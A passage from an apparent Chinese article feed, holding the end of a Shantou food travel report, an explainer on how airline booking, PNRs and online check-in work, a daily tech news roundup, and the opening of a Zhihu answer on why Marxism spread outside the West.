alt=\"\"></figure><p>𬒈石大桥远望如海口的世纪大桥，在西堤公园既能欣赏𬒈石大桥跨立两岸的壮美风光，也能望见底部灰白混凝土与鲜红底座的规整几何结构。胆大的三两游客，下到海滩，攀上底座，拍几张独特的人像风光。另外让我印象深刻的是，公园里的一排户外琴叶榕，长得极好。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/07ae1897ef2b55d218e044a19db47a3b.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/63aadc15ce41c82658c3b1890927f970.jpg\" alt=\"\"></figure><h2>金凤酒楼：粤式早茶</h2>\n<p>看完日落，到了晚上 19 点才抵达饭店，晚饭选在了广式早茶——金凤酒楼。到了晚上竟然客人寥寥，难道是汕头居民践行了字面意义上的「早茶」的概念？</p>\n<p>招牌蛋挞售罄，好在豆苗饺非常不错，新鲜爽口，内陷丰富，有豆苗、荸荠、胡萝卜、芹菜、香菇、虾肉，中午一顿牛肉火锅之后，非常需要补充植物纤维。虾饺个头太小，味道是正宗的虾饺风味。值得点赞的是水晶皮，特别薄，有嚼劲，晶莹透亮，没有面粉气。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/07/3eb95e58415b3117713e58941a98e51e.jpg\"></figure><h2>桂园白粥：生腌海鲜</h2>\n<p>到了夜里，再来一顿生腌海鲜。</p>\n<p>夜晚的汕头才像一座有活力的城市，一点点、益禾堂、伏见桃山都亮起灯来，原来这儿的居民都是夜行者。我恍然原先察觉白天对这座城市的印象错得离谱。也难怪，白天炎热，本地人谁会爱顶着烈日出门闲逛呢？</p>\n<p>桂园白粥，不是桂圆。汕头老城区的小区皆是「园字辈」，榕园、桂园、竹园、梅园，挨着延伸铺开。若是以为「桂圆白粥」，怕是要被误解为甜品店。说叫白粥，其实是腌海鲜店。</p>\n<p>招牌菜品腌虾姑、腌蟹，清凉顺滑，醋味十足，生津开胃，是夏季清爽饮食的绝佳选择。虾姑扎嘴，没法咬开，只能咬壳吮吸；而腌蟹已切开，露出大块蟹肉，轻轻一咬就掉下，吃起来很满足，如果冻般顺滑。炒花蛤，不论个头与口味都可以与海南「面朝大海鲜」的相比，不过少了芒果与辣椒，少许多风味。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/b2755760b1f75c1ca0a2d486aa1e6367.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/b5c44138cf7dc0d9cc8b4eda2691259d.jpg\" alt=\"\"></figure><h2>没有蟹黄的蟹皇面：合顺牛肉</h2>\n<p>第二天睡到自然醒，起来觅食。早上十点，汕头已经流金铄石。</p>\n<p>我们前往的是东边的「合顺牛肉」。如阿猴一般，这也是以供应屠宰牛肉、牛肉粿条的老店，后来开发出了新菜品「牛肉蟹黄面」，成了游客之选。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/07/684a9ca7478fe495211ad60ad9a6ee1a.jpg\"></figure><p>店面不大，四张桌子，比正常营业的时间还晚些，来的全是游客，断断续续竟也络绎不绝。这是家庭经营的小店，丈夫点餐、妻子料理，还有一位婆婆负责收拾整理，因此做得很慢，而且一桌一桌料理上菜，倒也挺有秩序。</p>\n<p>牛肉蟹黄面，就是牛肉粿干捞的做法，把面条换成了「蟹皇面」，因此这牛肉蟹黄面没有没有蟹黄。蟹皇面干爽，牛肉超大份，口感鲜嫩，沙茶酱沙甜，实属小吃美味。这样一比，店里的牛肉粿就要逊色许多了。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/6901940fd20e3be434f0094c06a0a3c1.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/5bf9b8c05d36e9d82d956753eb2110e2.jpg\" alt=\"\"></figure><h2>克莱因蓝：Chill Coffee</h2>\n<p>在汕头有一家克莱因蓝主题的咖啡店，Chill Coffee。这是在更东边，在居民楼底下开辟的一间小店。墙面用克莱因蓝和白色粉刷，从桌椅、手办、画框、杯子香薰、海报全是用克莱因蓝或点缀或铺开，身处其间感受沉静与放松。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/d95702c0111c14a950c10e3db69f5d36.JPG\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/4bceaf4fe608dbccbb8eab0dea84adb7.jpg\" alt=\"\"></figure><p>咖啡师是个姑娘，一头蓝灰漂染的头发。冰博克是自家用牛奶进行浓缩，dirty 的味道中规中矩，不过能喝到热咖啡液+冰牛奶的口感，牛奶先从淡味过渡为甜味，超可。 凤梨百香果美式，酸酸甜甜，是果味特调咖啡里属于很不错的口感。吧台放着很多专属贴纸，供客人带走装饰或即刻贴在杯身。</p>\n<p>已过正午，客人三三两两而来，饮完一杯即离去。店内只有我们久坐长待，消磨时间挨过酷热。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/96bf0766997b276d4578cd3f088ff85f.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/ab71941e3d90ee97e0a355bccc589b16.jpg\" alt=\"\"></figure><h2>牛肉火锅必吃榜：杏花吴记</h2>\n<p>在汕头的第二顿牛肉火锅，是大众点评必吃榜上榜的杏花吴记，这是由自家屠宰场供应土黄牛肉的牛肉火锅店，现在已经成了排队超久的口碑店。</p>\n<p>肉少，装在餐碟里只有表面小小的一层，一碟牛肉只够烫一轮。这里的菜单，把牛肉的部位标识清楚，便于客人点餐。我们也点了匙仁、肥牛等部位。另有匙柄，与匙仁相比，它中间有条筋，类似于胸口油，烫过 8 秒很有嚼劲。在点评吊龙的口感时，同行的小伙伴提出了十分恰当的描述：吊龙的每一丝肥肉都嵌入到瘦肉中间。不过杏花吴记的吊龙，筋偏多。</p>\n<p>杏花吴记的翻台率很高，8 秒一碟牛肉，牛肉丸 15 分钟，所以基本上一桌客人在 30-40 分钟就结束了用餐，而且牛肉很顶，很快就饱。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/bfd2809728c89c51932426a78bd2bba4.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/8ab868b5129413daf73a1c95737aa7cb.jpg\" alt=\"\"></figure><p>相比而言，我更爱阿猴那种粗放式的肉碟，看着吃着都很满足。阿猴这样的本地店铺不讲究环境高雅、不追求服务品质，像是在自家客厅改造的大堂用餐，更有接地气的饮食感受。</p>\n<h2>汕头本地奶茶：成川治茶</h2>\n<p>汕头本地奶茶有两家较为出名。一是「潮茶」，开在小公园亭，游客光顾多自然评价人多，不过毁誉参半。另一家便是「成川治茶」，听起来很有中式古风感觉，评价清一色的好评，开在远离景区的居民楼底。在坐上机场大巴之前，赶去喝了一杯。</p>\n<p>招牌「春江水暖」，听名字便有诗情画意了。用的是鸭屎香，这是乌龙茶的一种，主要产区就在潮州的凤凰山。尽管叫鸭屎香，但这名字和茶的色泽、香味全然无关，这名字的来源也有很多版本，只需知道这是乌龙茶中的上品即可。「春江水暖」用鸭屎香茶液和鲜奶，香浓可口。上层铺上厚厚的忌廉，也就是鲜奶油，最后撒上薄薄的一层核桃仁，让饮用全程和后期，都能有新鲜的口感。</p>\n<p>「成川治茶」的口号是「半杯是鲜奶，半杯是鲜茶」，确实值得一喝。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/315852660434e1f079e402bbbdbf7438.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/c44de26b716edfc3e7c740a9b7b66b2e.jpg\" alt=\"\"></figure><h2>小结</h2>\n<p>汕头的机场线，有不同的路线与发车站，在金海湾大酒店发车的线路，车次最为密集，途径汕头站停靠，之后便直达揭阳潮汕机场。</p>\n<p>潮汕分为潮州和汕头，但相比而言，汕头更有「玩头」。一是临海，二是文化丰富，三是区域更大。汕头除了南北隔海相望区划外，远离陆地如风筝般漂在海上的南澳岛，也是旅游观光胜地。如果时间充裕，可以安排一天的时间登岛感受小岛风情。</p>\n<p>隐藏玩法：从杭州萧山机场出发，可以在国内出发 9 号门附近的中国邮政盖到邮戳以及两枚萧山机场纪念章。揭阳潮汕机场没有设立中国邮政，推荐在小公园的「汕头开埠邮局陈列馆」盖邮戳，这里既是正常营业的中国邮政，也是邮局主题陈列馆，一枚清末风情的纪念章独具特色。另外在海关关史陈列馆也有一枚旅游纪念章，蓝色墨料，倒也特别。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/07/9cc2aebe46a6d1c7e309cc6a785ef90b.jpg\"></figure><p>出行费用：本次汕头两日游共计花费 1090.44 元。</p>\n<hr>\n<ul>\n<li><a href=\"https://sspai.com/post/66203\" target=\"_blank\">快乐飞旅行报告 01：广州的早茶可以从早喝到晚</a></li>\n<li><a href=\"https://sspai.com/post/66285\" target=\"_blank\">快乐飞旅行报告 02：除了武汉特色小吃，还有惬意的土耳其咖啡店</a></li>\n<li><a href=\"https://sspai.com/post/66445\" target=\"_blank\">快乐飞旅行报告 03：故宫的花开了</a></li>\n<li><a href=\"https://sspai.com/post/66183\" target=\"_blank\">快乐飞旅行报告 04：我低估了沈阳人民对于「小份」的定义</a></li>\n<li><a href=\"https://sspai.com/post/66510\" target=\"_blank\">快乐飞旅行报告 05：两天的贵阳都是吃</a></li>\n<li><a href=\"https://sspai.com/post/66745\" target=\"_blank\">快乐飞旅行报告 06：自驾在海南最美公路</a></li>\n<li><a href=\"https://sspai.com/post/67443\" target=\"_blank\">快乐飞旅行报告 07：郑州的胡辣汤辣口不辣心</a></li>\n</ul>\n","link":"https://sspai.com/post/67586"},{"title":"订票、选座、值机：为你解答那些关于机票的「为什么」","date":"2021-07-08 03:31:20","description":"\n<p><strong>Matrix 首页推荐</strong></p>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<h2>前言</h2>\n<p>在电视剧里，我们经常看到霸道总裁临时决定明天出行行程，在电话里跟秘书说一句：「帮我订一张明天的机票」；在工作中，我们时常也面临帮上司同事预定出行机票的情况；在生活中，全家出行一人订票更是家常便饭。</p>\n<p>那你有没有想过，在手机上打开携程或航司们的 app，选择航班订购机票完成值机这一气呵成的操作背后，到底是怎样一套运行机制？</p>\n<p>——它复杂吗？为什么 app 总是告诉我余票充足，而不告诉我这架飞机到底剩几个位置呢？为什么网上值机总会有一大堆灰色的不可选座位，但上机之后空空落落，只有中间几排坐了人？</p>\n<p>如果你有这些疑问，那这篇文章将一一作出解答。</p>\n<h2>购买机票的实际过程，其实并不简单</h2>\n<p>如果你需要登机，你就需要一张机票，这毋庸置疑。</p>\n<p>如果你是一个空中飞人，你就会发现不同机场的纸质机票虽然有着不同的布局、不同的 logo、不同的背部广告等，但正面展示的信息基本相同，我们暂且认为这是旅客在机场完成值机、行李托运、安检、登机等一系列手续所需的基本信息，以不同的布局、不同的格式展现在这种不大不小的长方形卡纸上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/00ebba62a99307e982665fdafca523be.jpg\"><figcaption>常见的纸质登机牌示意图</figcaption></figure><p>那么，这些信息是否都必要呢？</p>\n<p>随着民航无纸化业务的普及，人们渐渐发现，很多业务的办理只需要票号、身份证就可以办理，比如值机或者行李托运，那么纸质登机牌上这些信息到底是为了什么呢？</p>\n<p>实际上，负责任的说，纸质登机牌上的明文信息更多是方便乘客去核对个人信息，找到对的登机口，找到对的座位号，除此之外，所有业务需要的信息，实际上都藏在登机牌角落里那不起眼的条形码或二维码里。</p>\n<p>要了解这个，我们就要谈谈机票业务的数据流转。</p>\n<h3><strong>你买票的时候，到底发生了什么？</strong></h3>\n<p>要了解买票的流程，你首先得明白一个航司内部的基础概念，叫做 GDS，全称 Global Distribution System，即「全球分销系统」。从名字你就能明白，这是一个大规模的销售网络系统，而在中国，这个系统叫做中航信（TravelSky）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/354751de38fcecd966d6c602c43fc6c2.jpg\"><figcaption>GDS 系统示意图，图片来自 travelpd.com</figcaption></figure><p>目前来说，GDS 系统的运行方式，主要分为三部分，而大部分旅客购票时发生的信息流转，都跟这三个部分密切相关：</p>\n<ul>\n<li>代理人机票销售系统 CRS，全称 Computer Reservation System。CRS 的作用在于由代理人（如携程、去哪儿等大型 OTA 及各个城市的小型代理人等）提供航班情况查询、航段销售、产品销售、订座记录查询、客票预定等功能，你在携程、去哪儿的购票行为，均跟 CRS 相关，由它们向相关航司统一提供旅客数据，完成预定过程。</li>\n<li>航司订座系统 ICS，全称 Inventory Control System，ICS 向代理人和自营渠道提供作为控制、航班排期、运价或收益、航空联盟、销售控制等参数。</li>\n<li>离港控制系统 DCS，全称 Departure Control System，主要控制旅客值机、航班配载、航班数据控制、登机联程等信息服务。</li>\n</ul>\n<p>你从 CRS 购票，CRS 会向 ICS 请求航班信息，并随后传输你的订座信息给 ICS，而在航班初始化之后，你的数据会从 ICS 流转到 DCS，并由 DCS 完成最后的值机、登机等流程。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/article/90af70a8eb4a217726fc1463faea966a\"><figcaption>航空 GDS 系统示意图，图片来自 https://xueqiu.com/7392384735/42623778</figcaption></figure><h2>在你起飞前，其实发生过很多事</h2>\n<p>人们说实践出真知，让我带你们走一遍从购票到值机，最后登机的全流程，你们就会发现实际上从订票到起飞，一切都没看起来这么简单。</p>\n<p>让我们从 CRS 端开始，当你在航空公司网站、app 或者第三方机票平台输入你想要查询的航班——比如「上海到北京，2021 年 6 月 15 号的机票」——点击搜索，这时候，CRS 会向 ICS 发送一个查询指令，这个指令一般是 AV（Availability 的缩写），格式为 <code>AV SHAPKX/15JUN/0000/D</code>。</p>\n<p>其中，<code>SHA</code> 是上海虹桥机场的三字码，<code>PKX</code> 是北京大兴机场的三字码，这套三字码系统是国际通用的 IATA 三字码标准<sup class=\"ss-footnote\" href=\"http://www.fjtd-logistics.com/show.asp?id=5455\" title=\"IATA 机场三字码，是一个由国际航空运输协会（IATA）规定、用于代表全世界大多数机场的代码。它用 3 个字母组成并在登机牌、行李牌以及航空运单（AWB）上最常见到。如：深圳宝安国际机场的 IATA 三字码为 SZX，香港国际机场为 HKG，新加坡樟宜国际机场为 SIN 等。\" footnote-id=\"1\">1</sup>，用来区分具体机场的不同（比如上海还有一个浦东机场为 <code>PVG</code>，而北京首都机场是 <code>PEK</code>）。在前端页面为了用户方便，一般会让用户输入上海这个城市，同时查出 <code>SHA</code> 和 <code>PVG</code> 分别到 <code>PEK</code> 和 <code>PKX</code> 信息，组合返回，并在航班列表页面标识出来。</p>\n<p>这时候，ICS 会返回航班列表以及对应的舱位等级和剩余数量。这里有个很有意思的点：如果剩余舱位数量小于 10，则会给出具体的数字，比如 1、2、3 等。但如果舱位充足，则会用 A 代替，这就是为什么你有时候查询只会看到「余票充足」四个字，那说明这个舱位的剩余数量超过了 9。至于实际数字是多少，CRS 也不知道。</p>\n<p>在你输入了个人信息并确认购票时，ICS 会获得你的姓名、证件号、联系方式等，并将航班信息和你的个人信息写入档案，返回给你一个档案编码，这个编码就是民航人员常说的 PNR（Passenger Name Record，即「个人信息记录」），并通过 PAT 指令生成运价信息，确认购票后，你就得到了我们常说的 13 位票号。至此，你的购票过程就成功了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/08/article/cf1f58128e413b2bf7898f414ef9ecf4\" alt=\"求问大神意大利签证用的机票预订单有PNR 没有护照号可以吗- 穷游问答\"><figcaption>常见的 PNR 数据，图片来自 https://ask.qyer.com/question/3478273.html</figcaption></figure><p>通常来说，13 位票号是不会重复的，因此在隐私保护协议中，票号会作为重要隐私保护。理论上来讲获得了票号，就能获得你的行程信息、个人信息，一旦泄露是十分危险的事情。PNR 则比较有趣，由于 PNR 只有六位，在目前全国旅客这么多的情况下，就算是 26 个字母加 10 个数字组成，也是不够用的，更遑论还要剔除 0 和 o 等相似字，所以 PNR 是有一个回收机制的——这个 PNR 服务完你的行程之后，会进入候选池，被下一个旅客随机抽取使用。</p>\n<p>有经验的朋友此时可能会发现，机票票号是有规律的。没错，机票票号通常为 13 位，其中前 3 位是航空公司的数字代码，后 10 位则是流水号，因此一般有经验的旅客看到前 3 位就能判断是哪家航司的票。</p>\n<p>言归正传，完成购票流程之后，我们就要等航班初始化之后，准备网上值机或者现场值机，然后起飞。「航班初始化」是一个业内用语，一般是代表航班及旅客信息从订座系统流转到离港系统后，由机场现场的小姐姐小哥哥点击航班初始化按钮确定初始化状态，这时候你才能在网络上完成值机动作。</p>\n<p>这个航班初始化的时间一般是由场站拟定的，所以你会发现有的场站起飞的航班，可以提前两天进行网上值机，而有的则只能提前一天甚至 12 小时进行值机。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/07/0daa01a96a797caeb02d7a8f7e366f9a.jpeg\"><figcaption>不同城市的航班初始化时间不同</figcaption></figure><p>来，现在让我们来进行值机。</p>\n<p>现在一般航司自己搭建的值机系统，是通过 PE 系统和航信底层进行交互，首先需要你的证件号，查出你的订座信息，但现在为了隐私保护，避免黑产通过穷举票号获得大量旅客的行程信息出售，一般会进行一次个人信息的校验，这就是为什么现在你们值机除了票号，还需要证件号、姓名、手机号、验证码等步骤。</p>\n<p>获得旅客订座信息之后，会有一张航班的座位图传输给航司，航司需要根据座位图上开放座位的数据，提示旅客哪些座位能网上值机，哪些座位则只能现场办理。</p>\n<p>这里又有一个有趣的知识点，一般为了航班配载考虑，头部和尾部的座位在网上值机的时候会被锁定，这是为了飞机在天空中飞行的平衡考虑；同样安全出口由于需要当面告知旅客相关注意事项，所以同样也是被锁定的，只能现场办理，所以有的旅客会发现网值能选的位置相对少得可怜，这就是出于安全需要了，如果想要这些特殊座位，还请麻烦移步现场值机。</p>\n<p>完成值机之后，有无纸化登机流程的航司会给旅客一张电子登机牌和二维码，这个二维码包含的信息可就丰富了，有你的行程信息、个人信息、登机序号等等等，可谓是大而全。所以，如果你要截图发在微博或者朋友圈请记得打码，这隐私泄露得可比你登机牌上明文可见的信息多多了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/07/663c4b0a23b40401871e894eef8a2e9e.jpg\"><figcaption>电子登机牌</figcaption></figure><p>之后，你拿着这个二维码过安检，安检处会拿到你的个人数据，并给你登机牌盖上「安检验讫」的章。至此，你终于完成了起飞的前置步骤，可以移步至登机口进行登机。</p>\n<h2><strong>结尾</strong></h2>\n<p>怎么样，看完上述的步骤之后，是不是有一些常年积累的疑问得到了解答呢？比如为什么网值可选的座位图这么少，为什么购票的时候看不到剩余的具体舱位数量等。当然，这也不是航司或者 OTA（Online Travel Agent，不是大家熟知的那个 OTA 哈）特意刁难旅客，属实是「系统设定」，如果有想了解的更多关于航司的信息，可以在评论留言，我会挑选一部分再写文章进行解答。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\">冲！</a></p>\n","link":"https://sspai.com/post/67218"},{"title":"派早报：特斯拉换装国产电机、格力将引进鸿蒙、刺客信条新作公布等","date":"2021-07-08 00:37:38","description":"\n<h2>特斯拉 Model 3 及 Model Y 将换装国产电机</h2>\n<p>特斯拉公司近期交付了搭载国产电机的 Model 3 和 Model Y 车型。与此前相比，新车型的电机功率及扭矩有所提升。特斯拉客服表示，换装国产电机后，最大功率和扭矩有细微提升，但驾驶者感受不到实际区别。<a href=\"https://www.pingwest.com/w/245595\" target=\"_blank\">来源</a></p>\n<h2>iPadOS 14 为 Apple Pencil 提供更多语言支持</h2>\n<p>7 月 7 日，Apple 公司更新了网站信息，确认 Apple Pencil 在 iPadOS 上可获得更多语言支持。本次新增的五种语言为德语、法语、西班牙语、意大利语和葡萄牙语，其中包含法语（比利时）、法语（加拿大）、法语（瑞士）、法语（法国）、德语（奥地利）、德语（德国）、德语（瑞士）、意大利语（瑞士）、意大利语（意大利）、葡萄牙语（葡萄牙）、葡萄牙语（巴西）、西班牙语（西班牙）、西班牙语（拉丁美洲）和西班牙语（墨西哥）等。用户使用这些语言手写文字时，系统可以识别其内容，此前仅支持中文和英文。<a href=\"https://www.macrumors.com/2021/07/06/apple-pencil-ipados-14-new-language-support/\" target=\"_blank\">来源</a></p>\n<h2>格力将引进鸿蒙操作系统</h2>\n<p>据韩国 Zdnet 新闻网报道，格力总裁董明珠表示：「今后将引进鸿蒙操作系统。」报道认为，格力是中国空调市场占有率最大的企业，且拥有智能手机业务，所以很可能会将鸿蒙系统置入手机。<a href=\"http://www.cankaoxiaoxi.com/digital/2021/0707/2445781.shtml\" target=\"_blank\">来源</a></p>\n<h2>索尼公司推出颈挂式扬声器 SRS-NB10</h2>\n<p>近日，索尼公司推出颈挂式扬声器 SRS-NB10。SRS-NB10 支持多设备连接，续航时间可达 10 小时，能够确保发出的声音只被佩戴者听到。SRS-NB10 将于今年 9 月在海外上市，定价 150 美元。<a href=\"https://cn.engadget.com/sony-srs-nb-10-neckband-speaker-040011104.html\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/08/article/949d3fbf512a169dd69d9378b329a615\"><figcaption>图片来自新闻源</figcaption></figure><h2>腾讯会议推出天籁语音模组</h2>\n<p>针对复杂声学场景下的实时语音，腾讯会议旗下的天籁实验室于 7 月 7 日正式推出天籁语音模组方案，该方案可以实现 12 米的精准长距离拾音，并且可以实现在多人语音时每人都可以听清，并可以对现场多种类型的噪音进行针对性消除，该方案将应用在腾讯会议 Rooms 专款机型上，后续将开放相关的音视频认证标准。<a href=\"https://www.tmtpost.com/nictation/5459532.html\" target=\"_blank\">来源</a></p>\n<h2>深圳出台国内首部综合性数据法规</h2>\n<p>7 月 6 日，深圳市人大常委会通过官网公布《深圳经济特区数据条例》（以下简称《条例》）。《条例》将于 2022 年 1 月 1 日正式生效，是国内数据领域的首部基础性、综合性立法。《条例》中明确对「人脸识别」、「指纹验证」、「声音解锁」、「虹膜识别」等生物识别数据的获取和滥用进行了限制，禁止「App 不全面授权就不让用」等限制性行为。<a href=\"https://www.donews.com/news/detail/1/3160361.html\" target=\"_blank\">来源</a></p>\n<h2>育碧公布下一代《刺客信条》项目</h2>\n<p>游戏开发商育碧公司通过第一方博客公布了下一代动作游戏《刺客信条》项目，该作的项目代号为「无限」（Infinity），将由育碧魁北克和蒙特利尔工作室联合开发。育碧表示，项目尚处早期阶段，游戏可能会横跨多个历史时期，预计将于 2024 年发布。<a href=\"https://news.ubisoft.com/en-us/article/GZi5hT4dBeM8YITOsJeCn/an-update-on-assassins-creed-infinity-and-the-future-of-the-assassins-creed-franchise\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/article/500a7080228cf921f23a681662153889\"><figcaption>图片来自新闻源</figcaption></figure><h2>杨紫琼将加盟《猎魔人》前传剧集</h2>\n<p>流媒体平台 Netflix 确认，华裔女演员杨紫琼将加盟《猎魔人》前传作品《猎魔人：血源》，出演剑精灵 Scían，该角色是游牧部族的最后一位幸存者。《猎魔人》前传将由原《猎魔人》剧组打造，故事设定于正传的 1200 年前，聚焦首位猎魔人的诞生。<a href=\"https://www.gcores.com/articles/138981\" target=\"_blank\">来源</a></p>\n<h2>你可能错过的好文章</h2>\n<ul>\n<li>💉 <a href=\"https://sspai.com/post/66902\" target=\"_blank\">关于新冠疫苗，你想知道的问题都在这里了</a>\n</li>\n<li>✒️ <a href=\"https://sspai.com/post/67584\" target=\"_blank\">不买可以先收藏 07：从自用到送礼，帮你选支好钢笔</a>\n</li>\n<li>💻 <a href=\"https://sspai.com/post/67541\" target=\"_blank\">新手如果没有搭建环境，还能怎样快速练习写代码？</a>\n</li>\n<li>🚗 <a href=\"https://sspai.com/post/67554\" target=\"_blank\">触摸蓝天、拥抱大地——青甘大环线记录</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67603"},{"title":"为什么马哲没有被西方国家（它的发源地）广泛接受，却在中国、俄国、拉美地区生根发芽？","date":"2021-07-07 23:06:42","description":"<div>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-f04d65ed0008119f42f578e3957a23a2_l.jpg?source=8673f162\"><span>墨子连山，</span><span>干货在这不受待见，我把他们放在“同名公众号”了……</span>\n<a href=\"https://www.zhihu.com/question/452023901/answer/1982443264\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>因为西方掉进了资本主义这个局部最优陷阱。</strong></p>\n<p>之前回答过一个类似的问题，为什么中国五千年文明，却没有发展出体系化的现代科学？</p>\n<p>答案同样是因为中国掉进了局部最优陷阱。</p>\n<p>欧洲为什么发展出了科学？因为他们一直在低位徘徊，文艺复兴开始触底反弹了。</p>\n<p>秦始皇统一中国，车同轨，书同文，建立了中央集权的统一帝国。在当时的生产力水平下，中央集权的大帝国可以统一调配资源，这些高度集中的资源被用在兴修水利、基础建设、国防安全等方面，其对生产力的促进是那些分散的小国无可企及的。</p>\n<p>从此之后，吃到中央集权甜头的中国人便始终追求着大一统。</p>\n<p>秦朝二世而亡，取而代之的汉朝仍然维持了大一统，经过几代人的摸索，终于由汉武帝找到中央集权的思想理论指导，即外儒内法。</p>\n<p>这种思想在今后的两千年中经受了岁月的考验，自始至终发挥着无与伦比的效用，足见其强大之处。</p>\n<p>隋唐发明的科举制度，可谓中国最伟大的发明，这种制度将外儒内法的思想发挥到了极致，在之后一千多年中的绝大部分时间里，中国始终保持着稳定的统一。</p>\n<p>正是这样的稳定统一，使得中国在两千年时间里屹立于世界之巅。</p>\n<p>然而，也正是由于这种优势，使得中国人的认知出现了局限，大家开始“一心只读圣贤书”，专注于道德修养，关注于人与人的关系。因为历史一再证明，只要能够把人的问题解决好，就可以维持相当优越的生活。于是，中国人开始忽视客观世界，甚至对物质产生了鄙视，更不要说去钻研客观事物了。</p>\n<p>一个典型的例子就是“格物”。既然叫“格物”，而没有叫“格人”，其最初的含义显然包含了客观事物。但是在后来的发展过程中，格的对象逐渐发生了偏移，最终焦点完全转移到了“欲情念”等主观方面。而这种关注自身的倾向并没有阻碍生产力发展，相反的，他造就了一批批的君子，在这些君子的领导之下，这个大一统的帝国得已稳定运行，客观上促进了生产力的发展。</p>\n<p>中国就此掉入局部最优陷阱。</p>\n<p>如果现在回头看，我们很容易发现这种陷阱，因为王朝持续的时间总是不能长久，经历了数个朝代之后，这种只关注人的倾向就很值得质疑了吧？如果我们只需要道德高尚的人，那么为什么那么多朝代都会灭亡呢？难道朝代延续会导致道德沦丧？这无论如何也讲不通吧？</p>\n<p>既然是认知问题，当局者迷，古人最终也没能跳出这个陷阱。他们总是从人的方面去总结前代的经验教训，殊不知，这里面最主要的原因并不是人，而是生产力发展无法满足人口增长。说白了，就是安居乐业时间长了，人口多了，但是粮食增长不够快，于是容错率越来越低，有点什么灾害就要饿肚子，人吃人。这也就是为什么朝代末年农民起义的根本原因，就是吃不上饭嘛！</p>\n<p>不过，以当时的数据统计能力，这个陷阱确实隐藏的太深了，也不能苛责古人。</p>\n<p>反观欧洲，为什么他们可以发展出科学？</p>\n<p>因为欧洲漫长中世纪，在宗教的统治下始终处于四分五裂的状态，使得资源无法集中调配，因此生产力始终发展缓慢。直到 14 世纪，意大利出现了资本主义萌芽，这是生产力发展的必然结果，中国早在宋代也已经出现了。</p>\n<p>区别是什么？</p>\n<p>中国的中央集权之强大，直接扼杀了资本主义萌芽，新兴的资产阶级根本没有能力挑战官僚集团，更不用说皇权了。</p>\n<p>而欧洲不同，他们的领主相对弱小，意大利当时只是一个个的小城帮，新型的资产阶级是有能力与他们进行较量的。于是，在生产关系适应生产力的大趋势下，资产阶级开启了文艺复兴运动。</p>\n<p>什么叫文艺复兴？</p>\n<p>说的好听，其实就是西方版的拿来主义。基督教体系已经摇摇欲坠，又没有新的体系可以替代，怎么办？于是意大利人开始病急乱投医，把被遗忘了一千多年的古希腊文明拿过来用，美其名曰“复兴”。</p>\n<p>他们对古希腊文明进行了升级改造，使之适应了资本主义生产关系，然后大言不惭的说自己是希腊文明的继承者。就文明的载体而言，他们使用着不同的文字和语言，很难说这是一种“继承”，其实更像是购买了一个老字号，打上了人家的牌子而已。</p>\n<p>不过，不论如何，这条路是走对了，然后就有了哥白尼、伽利略……</p>\n<p>另一方面，由于低下的生产力难以养活增长的人口，于是逼出了大航海时代，然后就是地理大发现。新的粮食作物、经济作物以及白银的发现直接助推资本主义发展进程。</p>\n<p>有钱了，自然就会有一批“闲人”，可以去研究一些与生产没有直接关系的学问，于是科学得到了大发展。</p>\n<p>既然欧洲人已经开启了科学之门，中国自然